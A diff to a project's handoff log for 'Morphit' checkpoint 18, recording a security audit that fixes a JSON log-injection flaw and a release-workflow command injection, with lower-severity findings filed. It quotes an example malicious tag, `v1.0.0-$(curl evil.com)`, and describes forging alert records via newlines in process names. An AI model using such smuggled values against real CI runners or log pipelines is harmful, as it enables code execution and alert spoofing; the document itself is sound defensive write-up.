@@ -1,10 +1,71 @@
-# TARBALL — Morphit pre-launch hardening, Part 121 (in progress, checkpoint 17)
+# TARBALL — Morphit pre-launch hardening, Part 121 (in progress, checkpoint 18 — deep-deep audit)
 
 **Snapshot date:** 2026-05-14
 
-**Tarball:** `morphit-audit-2026-05-121-cp17-delta.tar.gz`
+**Tarball:** `morphit-audit-2026-05-121-cp18-delta.tar.gz`
 
-**Previous tarball:** `morphit-audit-2026-05-121-cp16-delta.tar.gz`.  This cp6 is a three-item plow-through finishing the work queued at the top of cp5's handoff: USDT drift sweep (Memory #26 finishing strokes), operator-stance surfacing (federation visibility into per-instance asset policy), and per-locale prerendering helpers (honest partial — full route restructure deferred per design-doc + Memory #11 since the sandbox can't `npm run build` end-to-end).
+**Previous tarball:** `morphit-audit-2026-05-121-cp17-delta.tar.gz`.  This cp6 is a three-item plow-through finishing the work queued at the top of cp5's handoff: USDT drift sweep (Memory #26 finishing strokes), operator-stance surfacing (federation visibility into per-instance asset policy), and per-locale prerendering helpers (honest partial — full route restructure deferred per design-doc + Memory #11 since the sandbox can't `npm run build` end-to-end).
+
+## Part 121 cp18 — what's shipped (deep-deep security audit of cp9-cp17 deltas)
+
+### Pretext
+
+cp17 sealed the schema-as-contract pattern across all 38 indexer-client interfaces.  Ken said "time now for deep deep code and security audits please".  cp18 is a black-hat walk through every cp9-cp17 attack surface.
+
+### TWO HIGH-SEVERITY findings FIXED
+
+**AUDIT-1: JSON-injection via control characters in `json_str()`**
+
+Unprivileged user could spawn a process with `comm` name = `legitname\n{evil-json}` (via `exec -a $'...'` or `prctl PR_SET_NAME`), trigger OOM-kill, kernel logged the `comm` to dmesg, `morphit-dmesg-monitor.sh` passed it through pre-fix `json_str()` (which only escaped `\\` and `"`), `systemd-cat` split at the embedded newline into TWO journal entries — the second being attacker-controlled forged JSON.  matrix-bot parsed the forged record as a legitimate alert.
+
+Impact: alert spoofing (DOS the operator's pager with fake CRITICALs → habituation), audit-log poisoning.  Same vector affected compose service names, third-party-repo package names, hostile FUSE mount paths.
+
+Fix: `json_str()` rewritten with `sed -z` (so newlines stay in pattern space; default `sed` reads line-by-line so `s/\x0a/.../g` never matched — was the root cause of the initial fix attempt not working) to encode every C0 control char per RFC 8259 §7.  Regression smoke `apps/matrix-bot/scripts/json-str-injection-smoke.ts` — 11 scenarios feeding known-malicious inputs through `json_str()` and validating round-trip via `JSON.parse`.  Caught two bugs in initial fix attempt.
+
+**AUDIT-CI-7: tag-name command injection in `release.yml`**
+
+`${{ steps.ver.outputs.tarball }}` was substituted directly into bash `run:` blocks.  Forgejo Actions expands `${{}}` BEFORE bash parses; `git-check-ref-format` allows `$ ( )` and spaces in tag names.  A malicious tag like `v1.0.0-$(curl evil.com)` would execute the command substitution on the release-builder CI runner.
+
+Fix: (1) strict tag-format validation step before any use (case-glob shape + char-class rejection — only `[A-Za-z0-9.-]` allowed); (2) pass `TARBALL` via `env:` not `${{}}` interpolation in subsequent steps.
+
+### MEDIUM/LOW findings FILED IN REVISIT (not fixed this turn)
+
+- **AUDIT-CI-1** (MEDIUM): `pull_request:` runs PR code on CI runner; standard open-source threat model
+- **AUDIT-ANSIBLE-1** (MEDIUM): NodeSource setup script runs as root unverified; refactor to apt-repo+GPG pattern
+- **AUDIT-NUMERIC** (MEDIUM): some sidecar numeric fields embedded unquoted; hostile FUSE could break JSON → alert suppression (not RCE)
+- **AUDIT-2** (LOW): ANSI escape sequences in raw_line plain-text path
+- **AUDIT-3** (LOW): Matrix mxid mention injection in raw_line
+- **AUDIT-4** (LOW): matrix-bot doesn't cap payload size
+- **AUDIT-CI-2** (LOW): third-party actions pinned by major version, not SHA
+
+### Brag list
+
+Zero new entries.  Security findings go to the AUDIT doc, not the brag list.
+
+### Verification
+
+- Triple-pulse: 2,871 × 3, 0 failures.  cp17 baseline 2,857 → cp18 baseline 2,871 (+14 net: 11 json-str-injection + 3 persona).
+- Typecheck-sweep: 0 errors across all 9 workspaces.
+- AUDIT-1 fix: 11/11 attack payloads round-trip correctly through `json_str()`.
+- AUDIT-CI-7 fix: `release.yml` parses as valid YAML; validation step uses POSIX-shell case-glob + char-class rejection.
+- envelope-smoke (24 checks) continues to pass — fix is backwards-compatible for valid inputs.
+
+### Pattern lessons
+
+1. **RFC 8259 §7 requires ALL C0 control chars escaped**, not just `\\` and `"`.
+2. **`sed` is line-oriented by default**; use `sed -z` to keep newlines in pattern space.
+3. **`${{}}` expansion in workflow `run:` blocks is shell-injection-equivalent**; pass via `env:` instead.
+4. **Git tag names accept `$ ( )` and spaces**; validate strictly before shell interpolation.
+5. **Write the regression smoke for each fix**.  The cp18 json-str smoke caught two bugs in the fix attempt before final form.
+
+### Pending — NOT cp18 SCOPE
+
+- Live full-stack Ansible test against fresh Ubuntu 24.04 VM (needs Ken's hardware)
+- Trigger `release.yml` with a real tag push (and a malformed-tag push to verify validation fails)
+- Apply MEDIUM findings: AUDIT-ANSIBLE-1, AUDIT-NUMERIC, AUDIT-CI-1
+- Apply LOW findings: AUDIT-2, AUDIT-3, AUDIT-4, AUDIT-CI-2
+
+---
 
 ## Part 121 cp17 — what's shipped (final indexer-side schema-coverage completion)
 
